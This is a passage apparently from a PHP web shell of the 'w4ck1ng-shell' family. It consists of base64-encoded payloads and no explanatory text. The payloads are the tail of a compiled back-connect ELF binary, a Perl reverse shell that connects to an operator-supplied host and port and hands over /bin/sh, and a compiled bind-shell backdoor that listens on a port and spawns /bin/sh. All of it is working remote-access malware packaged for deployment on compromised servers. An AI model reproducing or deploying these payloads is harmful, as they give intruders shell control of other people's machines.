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AAAAAAAAAAAAgAAAABwMAACyZBAgAAAAAEALx/x0DAAAAAAAAAAAAACAAAAAAY2FsbF9nbW9uX3N0YXJ0AGNydHN0dWZmLmMAX19DVE9SX0xJU1RfXwBfX0RUT1JfTElTVF9fAF9fSkNSX0xJU1RfXwBwLjAAY29tcGxldGVkLjEAX19kb19nbG9iYWxfZHRvcnNfYXV4AGZyYW1lX2R1bW15AF9fQ1RPUl9FTkRfXwBfX0RUT1JfRU5EX18AX19GUkFNRV9FTkRfXwBfX0pDUl9FTkRfXwBfX2RvX2dsb2JhbF9jdG9yc19hdXgAYmFjay5jAGV4ZWNsQEBHTElCQ18yLjAAX0RZTkFNSUMAY2xvc2VAQEdMSUJDXzIuMABfZnBfaHcAcGVycm9yQEBHTElCQ18yLjAAX19maW5pX2FycmF5X2VuZABfX2Rzb19oYW5kbGUAX19saWJjX2NzdV9maW5pAHN5c3RlbUBAR0xJQkNfMi4wAF9pbml0AGRhZW1vbkBAR0xJQkNfMi4wAF9zdGFydABzdHJsZW5AQEdMSUJDXzIuMABfX2ZpbmlfYXJyYXlfc3RhcnQAX19saWJjX2NzdV9pbml0AGluZXRfYWRkckBAR0xJQkNfMi4wAF9fYnNzX3N0YXJ0AG1haW4AX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABfX2luaXRfYXJyYXlfZW5kAGR1cDJAQEdMSUJDXzIuMABzdHJjYXRAQEdMSUJDXzIuMABkYXRhX3N0YXJ0AF9maW5pAF9fcHJlaW5pdF9hcnJheV9lbmQAYnplcm9AQEdMSUJDXzIuMABleGl0QEBHTElCQ18yLjAAYXRvaUBAR0xJQkNfMi4wAF9lZGF0YQBfR0xPQkFMX09GRlNFVF9UQUJMRV8AX2VuZABodG9uc0BAR0xJQkNfMi4wAGNvbm5lY3RAQEdMSUJDXzIuMABfX2luaXRfYXJyYXlfc3RhcnQAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19wcmVpbml0X2FycmF5X3N0YXJ0AF9fZ21vbl9zdGFydF9fAA==";

$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiOyc7DQokc3lzdGVtMT0gJ2VjaG8gImBpZGAiOyc7DQokc3lzdGVtMj0gJ2VjaG8gImBwd2RgIjsnOw0KJHN5c3RlbTM9ICdlY2hvICJgd2hvYW1pYEBgaG9zdG5hbWVgOn4gPiI7JzsNCiRzeXN0ZW00PSAnL2Jpbi9zaCc7DQokMD0kY21kOw0KJHRhcmdldD0kQVJHVlswXTsNCiRwb3J0PSRBUkdWWzFdOw0KJGlhZGRyPWluZXRfYXRvbigkdGFyZ2V0KSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQokcGFkZHI9c29ja2FkZHJfaW4oJHBvcnQsICRpYWRkcikgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsNCnNvY2tldChTT0NLRVQsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCmNvbm5lY3QoU09DS0VULCAkcGFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOw0Kb3BlbihTVERPVVQsICI+JlNPQ0tFVCIpOw0Kb3BlbihTVERFUlIsICI+JlNPQ0tFVCIpOw0KcHJpbnQgIlxuXG46OiB3NGNrMW5nLXNoZWxsIChQcml2YXRlIEJ1aWxkIHYwLjMpIHJldmVyc2Ugc2hlbGwgOjpcblxuIjsNCnByaW50ICJcblN5c3RlbSBJbmZvOiAiOyANCnN5c3RlbSgkc3lzdGVtKTsNCnByaW50ICJcbllvdXIgSUQ6ICI7IA0Kc3lzdGVtKCRzeXN0ZW0xKTsNCnByaW50ICJcbkN1cnJlbnQgRGlyZWN0b3J5OiAiOyANCnN5c3RlbSgkc3lzdGVtMik7DQpwcmludCAiXG4iOw0Kc3lzdGVtKCRzeXN0ZW0zKTsgc3lzdGVtKCRzeXN0ZW00KTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";

$backdoor="f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIUECDQAAAD4EgAAAAAAADQAIAAHACgAIgAfAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIrAkAAKwJAAAFAAAAABAAAAEAAACsCQAArJkECKyZBAg0AQAAOAEAAAYAAAAAEAAAAgAAAMAJAADAmQQIwJkECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAACAAAAAAAAABEAAAATAAAAAAAAAAAAAAAQAAAAEQAAAAAAAAAAAAAACQAAAAgAAAAFAAAAAwAAAA0AAAAAAAAAAAAAAA8AAAAKAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAABAAAAAAAAAAcAAAALAAAAAAAAAAQAAAAMAAAADgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4AAAAAAAAAdQEAABIAAACgAAAAAAAAAHEAAAASAAAANAAAAAAAAADMAAAAEgAAAGoAAAAAAAAAWgAAABIAAABMAAAAAAAAAHgAAAASAAAAYwAAAAAAAAA5AAAAEgAAAFgAAAAAAAAAOQAAABIAAACOAAAAAAAAAOYAAAASAAAAOwAAAAAAAAA6AAAAEgAAAFMAAAAAAAAAOQAAABIAAAB1AAAAAAAAALkAAAASAAAAegAAAAAAAAArAAAAEgAAAEcAAAAAAAAAeAAAABIAAABvAAAAAAAAAA4AAAASAAAAfwAAAEiJBAgEAAAAEQAOAEAAAAAAAAAAOQAAABIAAAABAAAAAAAAAAAAAAAgAAAAFQAAAAAAAAAAAAAAIAAAAABfSnZfUmVnaXN0ZXJDbGFzc2VzAF9fZ21vbl9zdGFydF9fAGxpYmMuc28uNgBleGVjbABwZXJyb3IAZHVwMgBzb2NrZXQAc2VuZABhY2NlcHQAYmluZABzZXRzb2Nrb3B0AGxpc3RlbgBmb3JrAGh0b25zAGV4aXQAYXRvaQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfc3RhcnRfbWFpbgBjbG9zZQBHTElCQ18yLjAAAAACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAQACAAAAAAAAAAEAAQAkAAAAEAAAAAAAAAAQaWkNAAACAKYAAAAAAAAAiJoECAYSAACYmgQIBwEAAJyaBAgHAgAAoJoECAcDAACkmgQIBwQAAKiaBAgHBQAArJoECAcGAACwmgQIBwcAALSaBAgHCAAAuJoECAcJAAC8mgQIBwoAAMCaBAgHCwAAxJoECAcMAADImgQIBw0AAMyaBAgHDgAA0JoECAcQAABVieWD7AjoMQEAAOiDAQAA6FsEAADJwwD/NZCaBAj/JZSaBAgAAAAA/yWYmgQIaAAAAADp4P////8lnJoECGgIAAAA6dD/////JaCaBAhoEAAAAOnA/////yWkmgQIaBgAAADpsP////8lqJoECGggAAAA6aD/////JayaBAhoKAAAAOmQ/////yWwmgQIaDAAAADpgP////8ltJoECGg4AAAA6XD/////JbiaBAhoQAAAAOlg/////yW8mgQIaEgAAADpUP////8lwJoECGhQAAAA6UD/////JcSaBAhoWAAAAOkw/////yXImgQIaGAAAADpIP////8lzJoECGhoAAAA6RD/////JdCaBAhocAAAAOkA////Me1eieGD5PBQVFJorYgECGhciAQIUVZoQIYECOhf////9JCQVYnlU+gbAAAAgcO/FAAAg+wEi4P8////hcB0Av/Qg8QEW13Dixwkw1WJ5YPsCIA94JoECAB0DOscg8AEo9yaBAj/0qHcmgQIixCF0nXrxgXgmgQIAcnDVYnlg+wIobyZBAiFwHQSuAAAAACFwHQJxwQkvJkECP/QycOQkFWJ5VeD7GSD5PC4AAAAAIPAD4PAD8HoBMHgBCnEx0XkAQAAAMdF+EyJBAjHRCQIAAAAAMdEJAQBAAAAxwQkAgAAAOgJ////iUXwg33wAHkYxwQkjIkECOg0/v//xwQkAQAAAOio/v//ZsdF1AIAx0XYAAAAAItFDIPABIsAiQQk6Jv+//8Pt8CJBCTosP7//2aJRdbHRCQQBAAAAI1F5IlEJAzHRCQIAgAAAMdEJAQBAAAAi0XwiQQk6BL+//+NRdTHRCQIEAAA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